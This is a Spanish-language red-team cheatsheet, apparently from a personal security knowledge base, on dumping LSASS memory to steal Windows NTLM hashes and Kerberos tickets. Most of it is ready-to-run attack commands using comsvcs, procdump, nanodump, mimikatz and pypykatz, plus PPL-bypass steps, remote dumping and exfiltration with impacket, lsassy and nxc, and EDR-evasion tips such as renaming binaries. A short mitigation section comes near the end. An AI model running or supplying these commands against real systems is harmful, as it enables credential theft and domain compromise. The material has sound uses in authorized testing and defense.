---
aliases:
  - LSASS
  - LSASS Dump
  - Local Security Authority Subsystem
tags:
  - type/atomic
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
  - cred/kerberos
  - service/lsass
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Exploitation]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Exploitation]]"
  - "[[Mimikatz Cheatsheet]]"
  - "[[Windows Privilege Escalation]]"
  - "[[Pass-the-Hash]]"
  - "[[Pass-the-Ticket]]"
---
# LSASS Dumping

***

## Cheatsheet
^lsass-dumping

| Método | Comando | Opsec |
| --- | --- | --- |
| **comsvcs.dll** | `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump PID C:\Temp\l.dmp full` | Firmado por MS, LOLBAS |
| **procdump (sysinternals)** | `procdump.exe -accepteula -ma lsass.exe l.dmp` | Firmado pero flagged |
| **Task Manager GUI** | Right-click lsass → Create dump file | Interactivo |
| **Nanodump (CS/BOF)** | `nanodump.x64.exe -w l.dmp` | Anti-dump engineering |
| **Dumpert** | `Dumpert.exe` | Direct syscalls, evade userland hooks |
| **mimikatz (in-memory)** | `sekurlsa::logonpasswords` | Sin dump, parse en memoria |
| **pypykatz (offline)** | `pypykatz lsa minidump l.dmp` | Parse offline de dump |
| **mimikatz offline** | `mimikatz # sekurlsa::minidump l.dmp; sekurlsa::logonpasswords` | Parse offline |

***

## Qué contiene LSASS

Local Security Authority Subsystem Service = proceso user-mode que maneja autenticación local/dominio. Guarda en memoria:

- **NTLM hashes** de sessions activas (users logueados).
- **Kerberos tickets** (TGT + TGS).
- **WDigest** passwords plain (si `UseLogonCredential=1` o <Server 2012R2).
- **TsPkg** (RDP) credentials.
- **LiveSSP** (Azure AD) tokens.
- **Credential Manager** masterkeys DPAPI.

Dump + parse → credential access a todo user que haya logueado al host desde último reboot.

## Requisitos

- **Admin local** (SeDebugPrivilege para abrir handle a lsass.exe).
- Proceso lsass.exe **no protegido** (PPL) O bypass PPL.
- AV/EDR tolerante (o evasion).

### PPL (Protected Process Light)

Desde Windows 8.1 / Server 2012 R2, lsass puede correr como PPL con firma `WinSystem`. Flag registry:
```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1
```

Con PPL activo, userland tools no pueden abrir handle. Bypass:
- Unload PPL vía driver firmado (`mimidrv.sys`, `RTCore64.sys`).
- `PPLFault` exploit (CVE-2022-41073 y variantes).
- `PPLdump` (Itm4n).
- `PPLBlade` → disable + dump + restore.

## 1. comsvcs.dll (LOLBAS, firmado Microsoft)

```cmd
# Pid de lsass
tasklist /svc /fi "IMAGENAME eq lsass.exe"

# Dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\l.dmp full
```

Opsec:
- Binario y DLL firmados MS.
- Typical detection: child process `rundll32` con comando `MiniDump` + argument lsass PID.
- Evadir con argumentos en base64 / caracteres unicode / renombre de rundll32.

### PowerShell wrapper
```powershell
$p = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p.Id C:\Temp\l.dmp full
```

## 2. Procdump

```cmd
# Sysinternals
procdump.exe -accepteula -ma lsass.exe C:\Temp\l.dmp

# Con timeout
procdump.exe -accepteula -ma lsass.exe C:\Temp\l.dmp -t 60
```

Detectable por nombre. Renombrar helps:
```cmd
copy procdump.exe svchost_helper.exe
svchost_helper.exe -accepteula -ma lsass.exe l.dmp
```

## 3. Task Manager (GUI, más silencioso)

```
1. Task Manager → Details tab
2. Right-click lsass.exe → Create dump file
3. Dump en %TEMP%\lsass.DMP
```

No deja rastro de herramienta/binario. Requiere sesión interactiva.

## 4. Nanodump (Cobalt Strike / standalone)

Engineering anti-dump: no abre handle con `PROCESS_ALL_ACCESS`, parsea PEB directamente.

```cmd
# Standalone
nanodump.x64.exe -w C:\Temp\l.dmp

# Con sección restore (restore original on read)
nanodump.x64.exe -w C:\Temp\l.dmp --valid

# Fork silencioso (via seclogon fork)
nanodump.x64.exe -w C:\Temp\l.dmp --fork
```

## 5. Dumpert (direct syscalls)

Evade userland hooks de EDRs llamando syscalls directos (no via ntdll).

```cmd
Outflank-Dumpert.exe
# → dump a C:\Windows\Temp\dumpert.dmp
```

## 6. MiniDumpWriteDump via custom loader

C/C++ propio o custom BOF con `MiniDumpWriteDump()` después de obtener handle vía:
- `OpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION)`.
- `NtGetNextProcess` iteration para encontrar lsass sin `CreateToolhelp32Snapshot`.
- Handle duplication desde proceso que ya tiene open handle.

## 7. Mimikatz in-memory (sin archivo)

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::tickets /export
```

Toca LSASS directamente — más detectable que dump-and-parse.

## 8. Parse offline del dump

### Mimikatz
```
mimikatz # sekurlsa::minidump C:\Temp\l.dmp
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export
```

### pypykatz (Linux / cross-platform)
```bash
pip install pypykatz

# Parse
pypykatz lsa minidump /path/l.dmp

# JSON output
pypykatz lsa minidump /path/l.dmp -o json > creds.json

# Solo NTLM
pypykatz lsa minidump /path/l.dmp | grep -E "NT|username"

# Export Kerberos tickets
pypykatz lsa minidump /path/l.dmp --kerberos-dir ./tickets/
```

## 9. Bypass PPL

### Con driver mimikatz (mimidrv.sys)
```
mimikatz # !+                  # Load driver
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # !processprotect /process:lsass.exe  # Restore
mimikatz # !-                  # Unload driver
```

Requiere firma válida del driver en kernel (WDAC puede bloquear).

### PPLBlade
```cmd
PPLBlade.exe --mode dump --name lsass.exe --handle-mode DirectHandle --dumpmode Direct --ObfuscateDump 1 --output C:\Temp\l.obf
```

### PPLdump
```cmd
PPLdump.exe -v lsass.exe C:\Temp\l.dmp
```

### Remove PPL (reboot required)
```cmd
# Editar registry
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
# Reboot → PPL off → dump normal
```

Ruidoso (requiere admin + reboot + editing security hive).

## 10. Remote LSASS dump

### SMB + admin credentials
```bash
# Via impacket-psexec + dump
impacket-psexec dom.local/admin:pass@target 'rundll32 comsvcs.dll MiniDump PID C:\Temp\l.dmp full'

# Exfil
smbclient.py dom.local/admin:pass@target
> get C:\\Temp\\l.dmp

# Parse
pypykatz lsa minidump l.dmp
```

### LSASSY (wrapper automatizado)
```bash
pip install lsassy

# Dump + parse + cleanup remoto
lsassy -u admin -p 'Pass' -d dom.local TARGET

# Masivo
lsassy -u admin -p 'Pass' -d dom.local TARGETS_FILE
```

Métodos soportados: `comsvcs`, `dumpert`, `procdump`, `nanodump`, `dllinject`, etc.

### nxc
```bash
nxc smb TARGET -u admin -p Pass --lsa
nxc smb TARGET -u admin -p Pass -M lsassy
nxc smb TARGET -u admin -p Pass -M nanodump
```

## 11. Credential Guard bypass

Credential Guard = VSM aísla secretos LSASS en VTL1 (hypervisor-protected). Dump normal devuelve encrypted blobs no parseables.

Bypass:
- Solo via vulnerabilities del hypervisor o downgrade de la config.
- No práctico in the wild — evitar targets con CG activo.

Check:
```cmd
dg-readiness-tool.ps1 -Ready
# o
Get-ComputerInfo | Select-Object -Property DeviceGuard*
```

## 12. OpSec

### Eventos
- **4656 / 4663** sobre lsass con ACCESS_MASK 0x1010 o 0x1410 (Read/VMread).
- **4688** proceso hijo de rundll32 con argumento comsvcs.
- AV/EDR signatures: `Sekurlsa`, `Mimikatz`, dump files en `%TEMP%`.
- Memory patterns: procdump strings, MiniDumpCallback signatures.

### Tips
- Parse offline > in-memory (menos CPU en target).
- Fork-based dump (seclogon) evita abrir handle directo.
- ObfuscateDump (PPLBlade) oculta magic bytes en disk.
- Renombrar binarios (procdump.exe → svchost.exe) evade por nombre.
- Desde SYSTEM + UtilityTokenDup de handle existente → no AV-visible OpenProcess.

## 13. Mitigaciones (blue)

- **Credential Guard** activar.
- **LSA Protection** (PPL) habilitar.
- **ASR rules** (Attack Surface Reduction):
  - `Block credential stealing from the Windows local security authority subsystem (lsass.exe)`.
- **Protected Users** group + disable WDigest/TsPkg.
- **Tiered admin** — DA no loguea en workstations.
- **EDR con kernel callbacks** sobre lsass access.

## Recursos

- [HackTricks - LSASS](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections)
- [Outflank - Dumpert](https://github.com/outflanknl/Dumpert)
- [Nanodump](https://github.com/fortra/nanodump)
- [pypykatz](https://github.com/skelsec/pypykatz)
- [PPLBlade](https://github.com/tastypepperoni/PPLBlade)
- [LSASSY](https://github.com/Hackndo/lsassy)

***
